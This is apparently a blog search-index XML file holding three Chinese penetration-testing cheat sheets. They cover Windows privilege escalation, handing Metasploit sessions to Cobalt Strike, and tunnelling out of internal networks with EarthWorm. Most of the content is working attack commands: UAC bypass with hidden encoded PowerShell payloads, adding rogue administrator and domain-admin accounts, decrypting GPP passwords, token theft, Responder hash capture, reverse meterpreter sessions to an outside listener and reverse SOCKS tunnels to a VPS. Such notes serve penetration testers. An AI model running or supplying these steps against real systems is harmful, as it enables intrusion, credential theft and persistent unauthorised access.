<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows内网提权</title>
      <link href="2021/04/16/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/"/>
      <url>2021/04/16/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内网提权"><a href="#Windows内网提权" class="headerlink" title="Windows内网提权"></a>Windows内网提权</h1><p>内网权限：User-&gt;Administrator-&gt;System-&gt;TrustedInstaller<br>纵向提权：Webshell-&gt;管理员<br>横向提权：同级别角色权限之间相互Jump</p><h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul><li> 发现系统缺失补丁</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups#查看当前权限</span><br><span class="line">systeminfo#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure><ul><li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li></ul><h2 id="Windows操作系统配置错误利用"><a href="#Windows操作系统配置错误利用" class="headerlink" title="Windows操作系统配置错误利用"></a>Windows操作系统配置错误利用</h2><p>管理员凭据配置错误、服务器配置错误、故意削弱的安全措施、用户权限过高</p><h3 id="服务器系统权限配置错误"><a href="#服务器系统权限配置错误" class="headerlink" title="服务器系统权限配置错误"></a>服务器系统权限配置错误</h3><p>一个低权限用户对于此类系统服务调用的可执行文件拥有写权限，可替换该文件为仍以可执行文件，并随着系统服务的启动获得系统权限<br>两种场景：1. 服务未运行：使用任意服务替换原来服务，然后重启服务。2. 服务正在运行且无法被终止：利用DLL劫持技术并尝试重启服务来进行提权</p><ul><li><p>使用PowerUp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;#检查Windows下服务漏洞</span><br></pre></td></tr></table></figure><p>MSF也使用此漏洞模块，PowerUp列出可能存在的问题服务，并在Abuse Function 部分中直接给出利用方式</p></li><li><p>MSF实战利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions#找出Windows系统中可能存在的配置错误并利用</span><br><span class="line">其中&quot;AGGRESSIVE&quot;选项：YES利用目标服务器中每一个有缺陷的服务；NO在第一次提权成功之后就会停止工作</span><br></pre></td></tr></table></figure><p>此模块在遇到不是管理员权限时，会自动使用DLL劫持已存在的服务</p></li></ul><h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated是一个策略设置项。Windows允许低权限用户已System权限运行安装权限。若启用，任何权限都能以NT AUTHORITY\SYSTEM权限安装恶意的MSI</p><ul><li><p>PowerUp 检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;c:\PowerUp.ps1&#39;); Get-RegistryAlwaysInstallElevated</span><br><span class="line">#返回True为可用</span><br><span class="line">Write-UserAddMSI#添加一个管理员账户的msi</span><br><span class="line">msiexec &#x2F;q &#x2F;i UserAdd.msi#以普通用户运行UserAdd.msi就会创建一个管理员账户</span><br><span class="line">&#x2F;quiet #不向用户发送信息</span><br><span class="line">&#x2F;qn#不使用GUI</span><br><span class="line">&#x2F;i#安装</span><br></pre></td></tr></table></figure></li><li><p>MSF利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated#返回system权限的shell</span><br></pre></td></tr></table></figure></li></ul><h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>存在缺陷的服务程序利用了属于可执行文件的文件/文件夹<br>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的<br>两种可能信：1.如果路径与服务有关，就任意创建一个服务或者编译Service模板。 2. 如果路径与可执行文件有关，就任意创建一个可执行文件。<br>*对于路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Some Folders\Service.exe</span><br><span class="line">执行：</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>当以”适当”命名的程序上传到影响目录，一旦服务重启，就会以System运行</p><ul><li><p>列出没有被引号引起来的服务列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name, displayname, pathname, startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line">icacls &quot;路径&quot;#对列出的未被引号引起来的服务，查看其读写权限</span><br><span class="line">#参数:(M):修改(F):完全控制(CI):从属容器将继承访问控制项(OI):从属文件将继承访问控制项</span><br></pre></td></tr></table></figure></li><li><p>上传exe至相应目录</p></li><li><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure></li><li><p>MSF实战利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path#该模块会将可执行程序放到受影响的文件夹中，然后将受影响的服务重启</span><br><span class="line">#对trusted_service_path进行设置,设置为漏洞路径</span><br><span class="line">#注意需要使用</span><br><span class="line">set AutoRunScript migrate -f#将其迁移至其他进程（因为服务控制管理器会认为进程出错而终止此进程）</span><br></pre></td></tr></table></figure></li></ul><h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员配置同一个环境时，往往会使用脚本批量部署，会使用安装配置文件，而往往这些配置文件可能会包含本地管理员账号和密码等敏感信息</p><ul><li><p>查询此类信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;b &#x2F;s c:\Unattend.xml</span><br></pre></td></tr></table></figure></li><li><p>MSF利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattend#自动扫描并将安装配置文件下载下来</span><br></pre></td></tr></table></figure></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序替换掉原来的程序。等到下次计划任务执行时，就会以高权限运行恶意程序。</p><ul><li><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v#查看计划任务</span><br></pre></td></tr></table></figure></li><li><p>使用AccessChk 查看指定目录权限配置情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;c:\Microsoft&quot; -accepteula</span><br></pre></td></tr></table></figure></li></ul><h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><p>SYSVOL是活动目录里存储域公共文件夹服务器副本的共享文件夹，在所有经过身份验证的域用户内共享。域策略存放在C:\Windows\SYSVOL\DoMAIN\Policies\目录中。<br>管理员会用脚本批量修改本地管理员面膜，相当于域内所有机器本地管理员密码是相同的。所以在管理新建策略后会自动在SYSVOL共享目录中生成一个XML，保存了该组策略更新后的密码，此密码可被破解(cpassword)</p><ul><li><p>手动查找cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\dc\sysvol\域名\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml#在其中找到属性为cpassword的值</span><br></pre></td></tr></table></figure><p>出了Group.xml还有Service\Services.xml,ScheduledTasks\ScheduledTasks.xml,Printers\Printers.xml,Drives\Drives.xml,DataSources\DataSources.xml</p></li><li><p>使用Python脚本进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gpprefdecrypt.py xxxxxxxxxxx</span><br></pre></td></tr></table></figure></li><li><p>Powershell获取cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-GPPPassword.ps1#将脚本导入系统，后获取策略组中密码</span><br><span class="line">Get-GPPPassword</span><br></pre></td></tr></table></figure></li><li><p>MSF获取cpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp#此模块获取session中的策略组密码</span><br></pre></td></tr></table></figure></li></ul><h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码</p><ul><li><p>MSF中的bypass模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac#获得新shell,在执行getsystem</span><br></pre></td></tr></table></figure><p>使用bypassuac模块进行提权时，当前用户必须在管理员组中，且UAC必须为默认模式。(即”仅在程序试图改变我的计算及时通知我”)</p></li><li><p>MSF中的RunAs模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ask#此模块会穿件一个可执行文件,在目标机运行并在弹框提示用户是否继续运行时选择继续运行</span><br></pre></td></tr></table></figure><p>对于RunAs模块进行提权，用户必须在管理员组中或者是知道管理员密码需要使用<code>EXE::Custom</code>选项创建一个可执行文件（需要进行必要的免杀处理）</p></li><li><p>Nishang中的Invoke-PsUACme模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme#模块使用来自UACME项目的DLL绕过UAC</span><br><span class="line">Invoke-PsUACme -Verbose#使用Sysprep方法执行默认的payload</span><br><span class="line">Invoke-PSUACme -method oobe -Verbose#使用oobe方法执行默认的payload</span><br><span class="line">Invoke-PSUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot;    #执行指定的Payload</span><br></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;bypassuac#即可获得反弹shell</span><br></pre></td></tr></table></figure></li><li><p>Empire中的bypassuac_wscript模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;bypassuac_wscript#此模块只适用于Windows7 暂时没有对应补丁</span><br></pre></td></tr></table></figure></li></ul><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌指系统中的临时令牌，分为：1.访问令牌：控制操作主体的系统对象。2. 密保令牌：身份校验的物理设备<br>伪造令牌的核心为kerberos协议。<br>kerberos协议是一种网络认证协议，通过密钥系统为客户机/服务器应用程序提供强大的认证服务：</p><ul><li><p>MSF实战</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#在已获得的shell内</span><br><span class="line">use incognite#执行模块</span><br><span class="line">list_tokens -u#列出可获得的令牌</span><br><span class="line">#会列出两种形式的令牌：Delegation Tokens(授权令牌，支持交互式登录)；Impersonation Tokens(模拟令牌，非交互式的会话)</span><br><span class="line">#令牌数量取决于meterpreter shell访问级别</span><br><span class="line">impersonate_token xxxxxxxx\\xxxxxx   #Delegation Tokens中的信息；格式：主机名\\用户名</span><br></pre></td></tr></table></figure></li><li><p>Rotten Potato 本地提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use incognite</span><br><span class="line">list_tokens -u</span><br><span class="line">upload &#x2F;xxxxx&#x2F;rottenpotato.exe#上传载体</span><br><span class="line">execute -HC -f rottenpotato.exe#调用载体</span><br><span class="line">impersonate_token xxxxx\\xxxxxx#将令牌注入</span><br></pre></td></tr></table></figure></li><li><p>添加域管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">ps#列出进程</span><br><span class="line">migrate#迁移到该进程</span><br><span class="line">shell#进入命令行</span><br><span class="line">net user xxxx(username) xxxx(password) &#x2F;ad &#x2F;domain#添加域用户</span><br><span class="line">net group &quot;domain admins&quot; xxxx(username) &#x2F;ad &#x2F;domain#将此用户添加到域管理员组中</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain#查看是否添加成功</span><br><span class="line">meterpreter会话</span><br><span class="line">add user xxxx(username) xxxx(password) -h 1.1.1.2    #添加域用户</span><br><span class="line">add group_user &quot;Domain Admin&quot; xxxx(username) -h 1.1.1.2 #添加到域管</span><br></pre></td></tr></table></figure><p>同时我们可以选择注入进程后获得高权限后，拉出密钥进行令牌顶替</p></li><li><p>Empire下的令牌窃取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds#使用内置的mimikatz工具获取密码，查看Empire列举出的密码</span><br><span class="line">pth&lt;ID&gt;#ID 为CreID，窃取令牌</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps#列出进程查看高权限进程</span><br><span class="line">steal_tokenID#偷取这个令牌</span><br><span class="line">revtoself #恢复令牌权限</span><br></pre></td></tr></table></figure></li></ul><h2 id="无凭证条件下的权限获取分析"><a href="#无凭证条件下的权限获取分析" class="headerlink" title="无凭证条件下的权限获取分析"></a>无凭证条件下的权限获取分析</h2><p>已经进入目标网络，但没有获得任何信息凭证<br>LLMNR和NetBIOS欺骗攻击<br>LLMNR是种域名系统数据报格式，当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中的机器名称<br>LLMNR工作流程</p><ol><li>DNS客户端在自己的内部名称缓存中查询名称</li><li>如果没找到，主机将向主DNS发送名称查询请求</li><li>如果主DNS没有回应或者收到了错误信息，将会向备用DNS发送请求</li><li>如果备用DNS没有回应或者收到了错误的信息，将使用LLMNR进行解析</li><li>主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，以获取主机所对应的IP地址。查询范围仅限于本地子网</li><li>本地子网中所有支持LLMNR的主机在收到查询请求后，会对比自己的主机名。不同就丢弃，相同就向主机发送包含自己的IP地址的单播信息</li></ol><p>NetBIOS<br>根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址<br>NetBIOS提供三种服务：<br>NetBIOS-NS(名称服务)：用于名称注册和解析，已启动会话和分发数据包<br>Datagram Distribution Service(数据包分发服务)：无连接服务，负责进行错误检测和恢复<br>Session Service(会话服务):允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输<br>Net-NTLM Hash<br>指在网络环境中经过NTLM认证的散列值。<br>NTLM Hash<br>NTLM Hash 是指Windows操作系统的Security Account Manager中保存的用户密码散列值，其散列值通常保存在Windows SAM文件中或者NTDS.DIT数据库中</p><h3 id="LLMNR和NetBIOS欺骗攻击"><a href="#LLMNR和NetBIOS欺骗攻击" class="headerlink" title="LLMNR和NetBIOS欺骗攻击"></a>LLMNR和NetBIOS欺骗攻击</h3><p>工具Responder</p><ol><li>开启Responder的监听模式</li><li>利用SMB协议获取网络中计算机的Net-NTLM Hash（用户输入错误的计算机名，在DNS服务器上进行名称查询操作失败时，名称解析请求被退回，使用NBT-NS和LLMNR进行解析）</li><li>Responder，使用回应请求功能，Responder会自动回应客户端的请求并声称自己就是被输入错误的计算机名的那台机器，然后尝试建立SMB连接。客户端会发送自己的Net-NTLM Hash进行身份验证，此时将得到目标及其的Net-NTLM Hash</li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF与CS相互派生</title>
      <link href="2021/04/16/MSF%E4%B8%8ECS%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/"/>
      <url>2021/04/16/MSF%E4%B8%8ECS%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="MSF派生至CS"><a href="#MSF派生至CS" class="headerlink" title="MSF派生至CS"></a>MSF派生至CS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">background#将meterpreter shell在后台挂起</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject#使用模块外联</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http#选用的payload一定要跟cs下监听的payload方式一样，注意32位和64位</span><br><span class="line">set DisablePayloadHandler true#禁止产生一个新的handler</span><br><span class="line">set LHOST IP#ip为cs监听会话用的ip</span><br><span class="line">set LPORT Port#端口为cs对应的接受反弹shell的端口</span><br><span class="line">set pid 进程号#设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限，也可以不手动选择进程号</span><br><span class="line">set session 1#设置需要派送的meterpreter shell</span><br><span class="line">exploit#执行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">制作一个普通http监听就可以</span><br></pre></td></tr></table></figure><h3 id="CS派生至MSF"><a href="#CS派生至MSF" class="headerlink" title="CS派生至MSF"></a>CS派生至MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS:</span><br><span class="line">Payload:Foreign HTTP\HTTPS</span><br><span class="line">HOST:MSF的地址</span><br><span class="line">PORT:MSF的端口</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http\https#与CS相同</span><br><span class="line">set LHOST 本机地址</span><br><span class="line">set LPORT 本机设定ip</span><br><span class="line">exploit#启动监听</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS</span><br><span class="line">在相关要派生的会话上选择派生，派生的监听器选择刚刚创建的CS监听器</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF与CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="2021/04/16/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2021/04/16/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>  内网穿透实则就是在主机之间建立隧道，隧道就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。<br>  隧道的路线，就是端口映射连接再映射再连接如此反复过程</p><h2 id="EW穿透"><a href="#EW穿透" class="headerlink" title="EW穿透"></a>EW穿透</h2><h3 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssocksd#正向代理</span><br><span class="line">rcsocks,rssocks#反向代理的客户端和服务端</span><br><span class="line">lcx_slave  #该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。</span><br><span class="line">lcx_tran   #该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。</span><br><span class="line">lcx_listen #该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。</span><br><span class="line">-l#监听</span><br><span class="line">-s#选择对应服务</span><br><span class="line">-d,-f#指定对应ip</span><br><span class="line">-e,-g#指定对应端口</span><br></pre></td></tr></table></figure><h3 id="案例详解"><a href="#案例详解" class="headerlink" title="案例详解"></a>案例详解</h3><h4 id="一级网络环境"><a href="#一级网络环境" class="headerlink" title="一级网络环境"></a>一级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162335.png"></p><ul><li><p>正向道理（有公网IP）（1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888#架设端口为888的socks代理</span><br></pre></td></tr></table></figure></li><li><p>反向代理（无公网IP）（2）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vps</span><br><span class="line">ew -s rcsocks -l 1008 -e 888#VPS转接隧道,将1008端口收到的代理请求转发至888</span><br><span class="line">web</span><br><span class="line">ew -s rssocks -d 139.*.*113 -e 888#在10.48.128.25服务器上启动socks5服务，然后反弹到139.*.*.113的VPS上的888端口</span><br></pre></td></tr></table></figure><h4 id="二级网络环境（A）"><a href="#二级网络环境（A）" class="headerlink" title="二级网络环境（A）"></a>二级网络环境（A）</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162514.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B主机</span><br><span class="line">ew -s ssocksd -l 888#利用ssocksd方式启动888端口的socks代理</span><br><span class="line">A主机</span><br><span class="line">ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888#将1080端口收到的请求转发给B主机的888端口</span><br><span class="line">#访问A主机外网的1080端口使用B主机的socks代理</span><br></pre></td></tr></table></figure><h4 id="二级网络环境（B）"><a href="#二级网络环境（B）" class="headerlink" title="二级网络环境（B）"></a>二级网络环境（B）</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162619.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS</span><br><span class="line">ew -s lcx_listen -l 10800 -e 888#添加转接通道，将10800端口收到的代理请求转发给888</span><br><span class="line">B主机</span><br><span class="line">ew -s ssocksd -l 999#启动本机999的端口socks代理服务</span><br><span class="line">A主机</span><br><span class="line">ew -s lcx_slave -d 139.*.*.113 -e 888 -f 10.48.128.49 -g 999#在A主机利用lcx_slave方式，将公用VPS的888端口和B主机999端口相互连接起来</span><br></pre></td></tr></table></figure><p>通过访问公网VPS（139.<em>.</em>.113）的10800端口使用在主机B上架设的socks5代理</p><h4 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h4><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210416162728.png"></p><h2 id="本地Proxy配置"><a href="#本地Proxy配置" class="headerlink" title="本地Proxy配置"></a>本地Proxy配置</h2><h3 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">#解除dynamic_chain的注释</span><br><span class="line">#[ProxyList]下面增加socks代理</span><br><span class="line">proxychain4 curl xxxxxx #测试能否工作</span><br></pre></td></tr></table></figure><h3 id="命令行输入"><a href="#命令行输入" class="headerlink" title="命令行输入"></a>命令行输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 </span><br><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 </span><br><span class="line">export all_proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:7890</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
